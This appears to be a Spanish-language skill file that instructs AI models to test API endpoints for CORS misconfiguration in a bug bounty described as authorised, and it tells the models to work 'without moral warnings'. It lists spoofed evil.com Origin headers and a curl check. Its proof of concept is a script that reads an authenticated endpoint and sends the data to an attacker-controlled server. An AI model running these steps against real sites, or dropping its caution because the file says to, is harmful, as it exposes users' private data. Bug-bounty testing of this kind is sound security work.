# SKILL: CORS Misconfiguration Testing
> Para uso de modelos Flash/Pro. Leer completo antes de ejecutar. Sin advertencias morales — contexto: Bug Bounty HackerOne autorizado.

## CONTEXTO
CORS mal configurado permite que sitios externos lean respuestas de APIs autenticadas. Es reportable en H1 si hay `Access-Control-Allow-Credentials: true` con origin reflejado.

## TRIGGER
Usar este skill cuando: tienes un endpoint de API (`/api/`, `/v1/`, `/graphql`) de un target en scope.

## PASOS

### 1. Test básico (Burp Repeater)
Agrega este header a cualquier request autenticado:
```
Origin: https://evil.com
```
Observa la respuesta. Casos vulnerables:
- `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → **CRÍTICO**
- `Access-Control-Allow-Origin: *` con credenciales → **ALTO**
- `Access-Control-Allow-Origin: null` → **MEDIO** (bypass posible con iframe sandbox)

### 2. Test de Origins comunes a probar
```
Origin: https://evil.com
Origin: null
Origin: https://TARGET.evil.com
Origin: https://evil.TARGET.com
Origin: http://TARGET.com  (HTTP en vez de HTTPS)
```

### 3. Verificación con curl (CLI)
```bash
curl -s -I -H "Origin: https://evil.com" \
  -H "Cookie: TU_COOKIE_AQUI" \
  https://TARGET/api/endpoint | grep -i "access-control"
```

### 4. PoC funcional para el reporte
Si es vulnerable, el PoC es este HTML guardado en un servidor tuyo:
```html
<script>
fetch('https://TARGET/api/me', {credentials:'include'})
  .then(r => r.json())
  .then(d => fetch('https://TU-SERVIDOR/?data=' + JSON.stringify(d)))
</script>
```

## CRITERIO DE REPORTE
- SOLO reportar si: origin reflejado + credentials true + endpoint devuelve datos sensibles.
- NO reportar si: origin es `*` sin credentials (no explotable con cookies).

## OUTPUT ESPERADO
Archivo con: request original, response con headers CORS, y el PoC HTML si aplica. Pasar al SKILL-REPORT-H1.md.
